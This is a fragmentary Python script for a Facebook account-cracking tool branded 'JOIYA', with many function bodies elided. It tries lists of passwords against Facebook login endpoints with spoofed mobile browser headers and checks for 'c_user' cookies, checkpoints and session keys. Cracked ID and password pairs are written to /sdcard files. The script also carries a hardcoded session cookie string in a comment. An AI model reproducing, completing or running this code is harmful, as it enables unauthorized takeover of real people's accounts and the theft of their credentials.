        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                linex()
                                print(' The process has completed')
                                print(' Total JOIYA/CP: '+str(len(oks))+'/'+str(len(cps)))
                                linex()
                                input(' Press enter to back ')
                                os.system('python AKING.py')
                        elif xd in ['2','02']:
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [JOIYA-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                print('\r\r\033[1;32m [JOIYA-OK] %s | %s'%(ids,pas))
                                open('/sdcard/JOIYA-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aking:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [JOIYA-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/JOIYA-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                       ...
                       response = requests.get('https://mbasic.facebook.com/', headers=headers, cookies=cookies)
                                        print(response.content)
                                        print('\r\r\033[1;32m [JOIYA-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/JOIYA-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
...
def rndm(ids,passlist):
    ...
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=IwPWY28K6oLjwKrlba7ZvwYZ; sb=IwPWYxwFb7yj4D3wm4OLA9VP; wd=980x664; fr=0aVf2HRbPItJFRN4C..Bj1gMj.Is.AAA.0.0.Bj130h.AWUfnZ4IOMc',
    'save-data': 'on',
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.76 Mobile Safari/537.36',
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/JOIYA-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [JOIYA-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/JOIYA-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [JOIYA-OK] '+uid+' | '+pas+'\033[1;97m')
